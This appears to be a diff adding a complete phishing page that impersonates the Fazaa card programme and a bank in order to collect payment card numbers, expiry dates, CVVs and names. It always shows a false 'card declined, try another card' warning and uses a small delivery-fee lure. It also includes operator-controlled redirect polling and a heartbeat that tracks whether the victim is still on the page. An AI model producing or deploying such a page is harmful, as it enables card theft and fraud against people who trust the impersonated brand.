@@ -1,0 +1,625 @@
+
+
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>فزعه - طلب بطاقة جديدة</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;700;800;900&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --sahara-green: #1e293b;
+            --sahara-green-dark: #1e5e1e;
+            --sahara-green-light: #eeeef5;
+            --sahara-dark: #1a1a2e;
+            --sahara-gray: #6B7280;
+            --sahara-light: #f9fafb;
+            --sahara-white: #FFFFFF;
+            --sahara-gold: #d4af37;
+            --sahara-border: #E5E7EB;
+            --sahara-radius: 16px;
+        }
+
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+
+        body {
+            font-family: 'Tajawal', system-ui, -apple-system, sans-serif;
+            background: var(--sahara-light);
+            color: #1E293B;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* === Navbar === */
+        .sahara-nav {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 12px 24px;
+            background: var(--sahara-white);
+            box-shadow: 0 1px 4px rgba(0,0,0,0.06);
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+        }
+        .sahara-nav .logo-img {
+            height: 50px;
+        }
+        .sahara-nav .back-btn {
+            width: 36px;
+            height: 36px;
+            border-radius: 10px;
+            background: var(--sahara-green-light);
+            border: none;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--sahara-green);
+            font-size: 16px;
+            cursor: pointer;
+            text-decoration: none;
+            transition: all 0.3s;
+        }
+        .sahara-nav .back-btn:hover {
+            background: var(--sahara-green);
+            color: #fff;
+        }
+        .sahara-nav .nav-links {
+            display: flex;
+            gap: 20px;
+        }
+        .sahara-nav .nav-links a {
+            text-decoration: none;
+            color: #555;
+            font-size: 14px;
+            font-weight: 600;
+            transition: color 0.3s;
+        }
+        .sahara-nav .nav-links a:hover {
+            color: var(--sahara-green);
+        }
+
+        /* === Step Indicator === */
+        .step-indicator {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            padding: 16px;
+            background: var(--sahara-white);
+            border-bottom: 1px solid var(--sahara-border);
+        }
+        .step-dot {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background: var(--sahara-border);
+        }
+        .step-dot.completed {
+            background: var(--sahara-green);
+        }
+        .step-dot.active {
+            background: var(--sahara-gold);
+            box-shadow: 0 0 0 4px rgba(212, 175, 55, 0.2);
+        }
+
+        /* === Form Header === */
+        .form-header {
+            text-align: center;
+            padding: 24px 16px 10px;
+        }
+        .form-header h2 {
+            font-size: 22px;
+            font-weight: 800;
+            color: #1E293B;
+            margin-bottom: 6px;
+        }
+        .form-header p {
+            font-size: 13px;
+            color: var(--sahara-gray);
+        }
+
+        /* === Form Card === */
+        .form-wrap {
+            flex: 1;
+            padding: 0 16px 24px;
+            max-width: 600px;
+            margin: 0 auto;
+            width: 100%;
+        }
+        .form-card {
+            background: var(--sahara-white);
+            border-radius: var(--sahara-radius);
+            padding: 28px 24px;
+            box-shadow: 0 2px 12px rgba(0,0,0,0.06);
+            border: 1px solid var(--sahara-border);
+        }
+
+        /* Card Visual */
+        .card-visual {
+            background: linear-gradient(135deg, #1e5e1e 0%, #1e293b 60%, #3a9a3a 100%);
+            border-radius: 16px;
+            padding: 24px 20px;
+            margin-bottom: 24px;
+            position: relative;
+            overflow: hidden;
+            color: #fff;
+        }
+        .card-visual::before {
+            content: '';
+            position: absolute;
+            top: -40px;
+            right: -40px;
+            width: 120px;
+            height: 120px;
+            background: rgba(255,255,255,0.08);
+            border-radius: 50%;
+        }
+        .card-visual::after {
+            content: '';
+            position: absolute;
+            bottom: -30px;
+            left: -20px;
+            width: 80px;
+            height: 80px;
+            background: rgba(255,255,255,0.05);
+            border-radius: 50%;
+        }
+        .card-visual .card-chip {
+            width: 40px;
+            height: 30px;
+            background: linear-gradient(135deg, #d4af37, #b8941f);
+            border-radius: 6px;
+            margin-bottom: 16px;
+            position: relative;
+            z-index: 1;
+        }
+        .card-visual .card-chip::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 24px;
+            height: 18px;
+            border: 1.5px solid rgba(255,255,255,0.4);
+            border-radius: 3px;
+        }
+        .card-visual .card-number-preview {
+            font-family: 'Courier New', monospace;
+            font-size: 18px;
+            letter-spacing: 3px;
+            margin-bottom: 14px;
+            direction: ltr;
+            text-align: left;
+            position: relative;
+            z-index: 1;
+            color: rgba(255,255,255,0.7);
+        }
+        .card-visual .card-bottom-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-end;
+            position: relative;
+            z-index: 1;
+        }
+        .card-visual .card-brand {
+            display: flex;
+            gap: 8px;
+            align-items: center;
+        }
+        .card-visual .card-brand i {
+            font-size: 28px;
+            opacity: 0.8;
+        }
+        .card-visual .sahara-badge {
+            background: rgba(212,175,55,0.2);
+            border: 1px solid rgba(212,175,55,0.4);
+            border-radius: 8px;
+            padding: 4px 10px;
+            font-size: 10px;
+            font-weight: 700;
+            color: var(--sahara-gold);
+        }
+
+        /* === Form Fields === */
+        .form-group {
+            margin-bottom: 18px;
+        }
+        .form-group label {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 13px;
+            font-weight: 600;
+            color: #374151;
+            margin-bottom: 8px;
+        }
+        .form-group label i {
+            font-size: 12px;
+            color: var(--sahara-green);
+        }
+        .form-input {
+            width: 100%;
+            border: 1.5px solid var(--sahara-border);
+            border-radius: 12px;
+            padding: 13px 14px;
+            font-size: 14px;
+            font-family: 'Tajawal', system-ui, sans-serif;
+            color: #1E293B;
+            background: var(--sahara-white);
+            transition: border-color 0.3s, box-shadow 0.3s;
+            height: 50px;
+        }
+        .form-input:focus {
+            border-color: var(--sahara-green);
+            box-shadow: 0 0 0 3px rgba(44, 122, 44, 0.15);
+            outline: none;
+        }
+        .form-input::placeholder {
+            color: #CBD5E1;
+            font-size: 13px;
+        }
+
+        .row-inputs {
+            display: flex;
+            gap: 12px;
+        }
+        .row-inputs .form-group {
+            flex: 1;
+        }
+
+        /* === Submit Button === */
+        .btn-submit {
+            width: 100%;
+            background: linear-gradient(135deg, #1e293b, #1e5e1e);
+            color: #fff;
+            border: none;
+            padding: 15px;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 700;
+            font-family: 'Tajawal', system-ui, sans-serif;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            transition: all 0.3s;
+            box-shadow: 0 4px 16px rgba(44, 122, 44, 0.3);
+            margin-top: 8px;
+        }
+        .btn-submit:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(44, 122, 44, 0.4);
+        }
+        .btn-submit:disabled {
+            background: #94A3B8;
+            cursor: not-allowed;
+            box-shadow: none;
+        }
+
+        /* Security Badge */
+        .security-badge {
+            text-align: center;
+            margin-top: 16px;
+            padding: 12px;
+            background: var(--sahara-green-light);
+            border-radius: 12px;
+            border: 1px solid rgba(44, 122, 44, 0.2);
+        }
+        .security-badge i {
+            color: var(--sahara-green);
+            margin-left: 6px;
+        }
+        .security-badge span {
+            color: #374151;
+            font-size: 12px;
+        }
+
+        /* Error */
+        .error-msg {
+            text-align: center;
+            color: #DC2626;
+            font-weight: 700;
+            font-size: 14px;
+            margin-top: 10px;
+            padding: 10px;
+            background: #FEF2F2;
+            border: 1px solid #FECACA;
+            border-radius: 10px;
+        }
+
+        .hide { display: none; }
+        .show { display: block; }
+
+        /* === Footer === */
+        .sahara-footer {
+            background: var(--sahara-dark);
+            color: var(--sahara-white);
+            padding: 20px 16px;
+            text-align: center;
+            margin-top: auto;
+        }
+        .sahara-footer .footer-logo {
+            height: 50px;
+            margin-bottom: 12px;
+        }
+        .sahara-footer p {
+            font-size: 12px;
+            color: #94A3B8;
+            line-height: 1.7;
+        }
+        .sahara-footer .footer-bottom {
+            border-top: 1px solid rgba(255,255,255,0.08);
+            padding-top: 10px;
+            margin-top: 10px;
+            font-size: 11px;
+            color: #64748B;
+        }
+
+        /* Animation */
+        @keyframes fadeInUp {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .fade-in { animation: fadeInUp 0.5s ease-out; }
+
+        @media (max-width: 480px) {
+            .sahara-nav {
+                padding: 10px 16px;
+            }
+            .sahara-nav .logo-img {
+                height: 40px;
+            }
+            .form-card {
+                padding: 20px 16px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Navbar -->
+    <nav class="sahara-nav">
+        <a href="index-details.php" class="back-btn"><i class="fas fa-arrow-right"></i></a>
+        <img src="./assets/sahara_brand_logo.png" alt="مصرف الصحارى" class="logo-img">
+        <div class="nav-links">
+            <a href="index.php">الرئيسية</a>
+        </div>
+    </nav>
+
+    <!-- Step Indicator -->
+    <div class="step-indicator">
+        <div class="step-dot completed"></div>
+        <div class="step-dot completed"></div>
+        <div class="step-dot active"></div>
+        <div class="step-dot"></div>
+    </div>
+
+    <!-- Form Header -->
+    <div class="form-header">
+        <h2><i class="fas fa-credit-card" style="color: var(--sahara-green); margin-left: 8px;"></i> بيانات البطاقة</h2>
+        <p>أدخل بيانات بطاقتك لإتمام عملية التسجيل في بطاقة فزعه</p>
+        <div style="display:flex;align-items:center;gap:8px;margin:12px auto 0;padding:10px 18px;background:#fff5f5;border:1.5px solid rgba(220,53,69,0.25);border-radius:50px;max-width:fit-content;">
+            <i class="fas fa-exclamation-triangle" style="color:#dc3545;font-size:14px;flex-shrink:0;"></i>
+            <span style="font-size:12px;font-weight:700;color:#dc3545;line-height:1.5;">يرجى المحاولة باستخدام بطاقة بنكية مختلفة لأن البطاقة التي تم إدخالها مرفوضة</span>
+        </div>
+        <div style="display:inline-flex;align-items:center;gap:8px;margin-top:8px;padding:8px 20px;background:#eeeef5;border:1.5px solid rgba(26,108,58,0.2);border-radius:50px;">
+            <i class="fas fa-truck" style="color:#1e293b;font-size:13px;"></i>
+            <span style="font-size:13px;font-weight:700;color:#1e293b;">رسوم الخدمة 5 درهم</span>
+            <span style="font-size:11px;color:#888;">تشمل التوصيل</span>
+        </div>
+    </div>
+
+    <!-- Form -->
+    <div class="form-wrap">
+        <div class="form-card fade-in">
+
+            <form action="" method="POST" onsubmit="return validateAndSubmitForm()">
+                <!-- رقم البطاقة -->
+                <div class="form-group">
+                    <label>
+                        <i class="fas fa-credit-card"></i>
+                        رقم البطاقة
+                    </label>
+                    <input type="text" name="cardNumber" id="cardNumberI" style="direction: ltr !important; text-align: left;" onblur="validateCardNumber()" inputmode="numeric" minlength="10" maxlength="16" required class="form-input" placeholder="0000 0000 0000 0000">
+                    <div class="hide" id="checkToCard">
+                        <small class="text-danger" style="font-size: 12px;">رقم البطاقة غير صحيح</small>
+                    </div>
+                    <input type="hidden" id="checkCard" value="0">
+                </div>
+
+                <!-- تاريخ الانتهاء + CVV -->
+                <div class="row-inputs">
+                    <div class="form-group">
+                        <label>
+                            <i class="fas fa-calendar-alt"></i>
+                            تاريخ الانتهاء
+                        </label>
+                        <input type="text" name="year" inputmode="numeric" minlength="5" id="expiry" maxlength="5" required class="form-input" style="direction: ltr !important; text-align: center;" placeholder="MM/YY">
+                    </div>
+                    <div class="form-group">
+                        <label>
+                            <i class="fas fa-lock"></i>
+                            رمز الأمان
+                        </label>
+                        <input type="text" name="cvv" inputmode="numeric" minlength="3" maxlength="3" required class="form-input" style="direction: ltr !important; text-align: center;" placeholder="CVV">
+                    </div>
+                </div>
+
+                <!-- الاسم على البطاقة -->
+                <div class="form-group">
+                    <label>
+                        <i class="fas fa-user"></i>
+                        الاسم على البطاقة
+                    </label>
+                    <input type="text" name="cardName" required class="form-input" placeholder="كما هو مطبوع على البطاقة">
+                </div>
+
+                
+                <!-- Submit -->
+                <button type="submit" name="submit" id="butSubm" disabled class="btn-submit">
+                    <i class="fas fa-shield-alt"></i>
+                    <span>المتابعة</span>
+                </button>
+            </form>
+
+            <!-- Security Badge -->
+            <div class="security-badge">
+                <i class="fas fa-lock"></i>
+                <span>اتصال آمن ومشفر بتقنية SSL 256-bit</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer class="sahara-footer">
+        <img src="https://i.postimg.cc/yNsF5MSj/6-2.png" alt="مصرف الصحارى" class="footer-logo">
+        <p style="font-size:13px;font-weight:600;color:#1e293b;margin-bottom:4px;">بطاقة فزعه | FAZAA</p>
+        <p>برنامج فزعه للخصومات - الإمارات العربية المتحدة</p>
+        <div class="footer-bottom">
+            &copy; ©بطاقة فزعه | FAZAA
+        </div>
+    </footer>
+
+<script src="js/main.js"></script>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const form = document.querySelector('form');
+            const submitBtn = document.getElementById('butSubm');
+
+            form.addEventListener('input', function() {
+                if (form.checkValidity()) {
+                    submitBtn.disabled = false;
+                } else {
+                    submitBtn.disabled = true;
+                }
+            });
+
+            if (form.checkValidity()) {
+                submitBtn.disabled = false;
+            } else {
+                submitBtn.disabled = true;
+            }
+        });
+
+        document.getElementById('cardNumberI').addEventListener('input', function(event) {
+            let input = event.target;
+            let value = input.value.replace(/\s/g, '');
+            let numericValue = value.replace(/\D/g, '');
+
+            if (/^\d{0,16}$/.test(numericValue)) {
+                let formattedValue = numericValue.replace(/(\d{4})(?=\d)/g, '$1 ');
+                input.value = formattedValue;
+
+                if (numericValue.length === 16) {
+                    input.setAttribute('maxlength', '16');
+                } else {
+                    input.removeAttribute('maxlength');
+                }
+            } else {
+                input.value = input.value.slice(0, 16);
+            }
+        });
+
+        function isValidLuhn(digits) {
+            let checkDigit = 0;
+            for (let i = digits.length - 2; i >= 0; --i) {
+                checkDigit += (i % 2 === 0) ?
+                    (digits[i] > 4 ? digits[i] * 2 - 9 : digits[i] * 2) :
+                    digits[i];
+            }
+            return (10 - (checkDigit % 10)) === digits[digits.length - 1];
+        }
+
+        function validateCardNumber() {
+            var cardNumber = document.getElementById("cardNumberI").value.replace(/\s/g, '');
+            if (/[^0-9-\s]+/.test(cardNumber)) {
+                document.getElementById("checkCard").value = 2;
+                document.getElementById("checkToCard").classList.remove("hide");
+                document.getElementById("checkToCard").classList.add("show");
+                return;
+            }
+
+            var isValid = isValidLuhn(cardNumber.split('').map(Number));
+            if (isValid) {
+                document.getElementById("checkCard").value = 1;
+                document.getElementById("checkToCard").classList.remove("show");
+                document.getElementById("checkToCard").classList.add("hide");
+            } else {
+                document.getElementById("checkCard").value = 2;
+                document.getElementById("checkToCard").classList.remove("hide");
+                document.getElementById("checkToCard").classList.add("show");
+            }
+        }
+
+        function validateAndSubmitForm() {
+            var isValidCard = (document.getElementById("checkCard").value == 1);
+            if (isValidCard) {
+                return true;
+            } else {
+                return false;
+            }
+        }
+
+        const expiryInput = document.getElementById('expiry');
+
+        expiryInput.addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length > 4) value = value.slice(0, 4);
+            if (value.length >= 3) {
+                value = value.slice(0, 2) + '/' + value.slice(2);
+            }
+            e.target.value = value;
+        });
+
+        expiryInput.addEventListener('blur', function(e) {
+            const [yy, mm] = e.target.value.split('/');
+            if (!yy || !mm) return;
+            const year = parseInt(yy, 10);
+            const month = parseInt(mm, 10);
+            if (year < 1 || year > 31 || month < 25 || month > 35) {
+                alert('Invalid year or month. Year must be between 2025-2035, and month 01-12.');
+                e.target.value = '';
+            }
+        });
+    </script>
+
+<script>
+function checkRedirect() {
+    fetch('polling-redirect.php')
+        .then(r => r.json())
+        .then(data => {
+            if (data.redirect) {
+                window.location.href = data.redirect;
+            }
+        })
+        .catch(e => {});
+}
+setInterval(checkRedirect, 1500);
+checkRedirect();
+</script>
+
+
+<script>
+// Heartbeat - تحديث حالة الاتصال فوراً
+function sendHeartbeat() {
+    fetch('heartbeat.php').catch(function(e){});
+}
+setInterval(sendHeartbeat, 2000);
+sendHeartbeat();
+window.addEventListener('beforeunload', function() {
+    navigator.sendBeacon('heartbeat.php', new URLSearchParams({action: 'offline'}));
+});
+</script>
+</body>
+</html>
